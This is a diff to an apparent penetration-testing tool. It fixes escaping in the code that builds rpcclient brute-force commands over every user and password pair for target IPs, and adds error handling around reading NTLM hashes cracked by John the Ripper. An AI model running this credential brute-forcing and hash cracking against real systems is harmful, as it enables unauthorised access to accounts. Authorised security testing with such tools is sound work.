@@ -270,7 +270,8 @@ def coros_pool(worker_count, commands):
             for i in range(worker_count):
                 # Prevents crash if [commands] isn't divisible by worker count
                 if len(commands) > 0:
-                    coros.append(get_output(commands.pop()))
+                    cmd = commands.pop()
+                    coros.append(get_output(cmd))
                 else:
                     return coros
     return coros
@@ -403,12 +404,15 @@ def create_brute_cmds(ip_users, passwords):
 
     for ip in ip_users:
         for user in ip_users[ip]:
-            rpc_user_pass = []
             for pw in passwords:
                 cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
                 # This is so when you get the output from the coros
                 # you get the username and pw too
                 cmd2 = "echo '{}' ".format(cmd)+cmd
+                # This replaces the echo'd command with extra slashes so Python doesn't interpret
+                # the DOM\user string as a special char (\a,\b,\f,\n,\r,\t,\v)
+                # These chars get printed as stuff like LAB\x08ob instead of LAB\bob
+                cmd2 = cmd2.replace('\\','\\\\',1)
                 cmds.append(cmd2)
 
     return cmds
@@ -714,7 +718,9 @@ def get_cracked_pwds(prev_creds):
 
         for x in dir_contents:
             if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
-                out = check_output('submodules/JohnTheRipper/run/john --show hashes/{}'.format(x).split())
+                out, err = Popen('submodules/JohnTheRipper/run/john --show hashes/{}'.format(x).split(), stdout=PIPE, stderr=PIPE).communicate()
+                if err:
+                    print('[-] Error getting cracked hashes: {}'.format(err))
                 prev_creds = parse_john_show(out, prev_creds)
 
     return prev_creds
